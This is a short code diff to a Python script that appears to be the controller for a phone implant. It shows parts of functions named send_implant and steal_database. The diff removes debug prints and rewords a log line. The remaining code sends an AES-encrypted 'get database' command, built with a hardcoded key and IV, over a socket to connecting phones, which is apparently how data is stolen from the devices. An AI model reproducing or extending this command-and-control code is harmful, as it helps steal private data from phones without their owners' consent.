@@ -30,9 +30,7 @@ def send_implant():
         print("Connection closed")
 
 def steal_database():
-    print(len("sourdoughtoast12"))
     key = "546869732069732061206b6579313233"
-    print(bytes.fromhex(key))
     iv = "5468697320697320616e204956343536"
     obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
     ciphertext = obj.encrypt(b"get" + b"\x00" * 13)
@@ -46,7 +44,7 @@ def steal_database():
         conn, addr = s.accept()
         print('Got connection from: ', addr)
         conn.send(ciphertext)
-        print("Encrypted Get Database command sent to phone")
+        print("Encrypted 'get database' command sent to phone")
         count += 1
         conn.close() 
         print("Connection closed")
